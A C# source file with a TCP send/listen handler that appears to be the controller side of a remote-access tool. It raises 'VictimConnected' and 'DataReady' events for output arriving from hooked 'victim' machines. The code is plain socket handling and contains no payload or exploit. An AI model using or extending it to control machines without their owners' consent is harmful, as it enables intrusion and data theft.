using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace PS03
{
    public abstract class INetworkHandler
    {
        public abstract void Send(string data);
        public abstract void Receive();


        public event EventHandler<string> VictimConnected;
        protected virtual void OnVictimConnected(string s)
        {
            EventHandler<string> handler = VictimConnected;
            if (handler != null)
                handler(this, s);
        }

        public event EventHandler<string> DataReady;
        protected virtual void OnDataReady(string s)
        {
            EventHandler<string> handler = DataReady;
            if (handler != null)
                handler(this, s);
        }
    }

    public class TCPNetworkHandler : INetworkHandler
    {
        private string _ip;
        private int _port;
        private TcpClient tcpclnt;

        public TCPNetworkHandler(string ip, int port)
        {
            _ip = ip;
            _port = port;
        }
        public TCPNetworkHandler(int port)
        {
            _port = port;
        }
        public override void Send(string datain)
        {
            try
            {
                tcpclnt = new TcpClient();
                tcpclnt.SendTimeout = 600000;
                tcpclnt.Connect(_ip, _port);
                var data = Encoding.ASCII.GetBytes(datain);
                var stream = tcpclnt.GetStream();
                stream.Write(data, 0, data.Length);
                tcpclnt.Close();
            }
            catch (Exception)
            {

                Console.WriteLine("Couldn't send - is the receiver listening?");
            }
         
        }

        public override void Receive()
        {
#pragma warning disable CS0618 // Type or member is obsolete
            var listener = new TcpListener(_port);
#pragma warning restore CS0618 // Type or member is obsolete
            var connected = false;
            bool VictimHooked = false;

            while (!connected)
            {
                try
                {
                    listener.Start();
                    connected = true;
                }
                catch (Exception)
                {
                    Thread.Sleep(200);
                }
            }

            while (true)
            {
                var client = listener.AcceptSocket();
                if (!VictimHooked)
                {
                    var remoteIpEndPoint = client.RemoteEndPoint as IPEndPoint;
                    HandleVictimConnected(remoteIpEndPoint.Address.ToString());
                    VictimHooked = true;
                }

                var childSocketThread = new Thread(() =>
                {
                    var data = new byte[5000000];
                    var size = client.Receive(data);

                    var rcv = "";
                    for (var i = 0; i < size; i++)
                        rcv += (Convert.ToChar(data[i]));

                    HandleOutputReady(rcv);

                    client.Close();
                });
                childSocketThread.Start();
            }
        }

        private void HandleOutputReady(string output)
        {
            OnDataReady(output);
        }

        private void HandleVictimConnected(string victim)
        {
            OnVictimConnected(victim);
        }
    }
}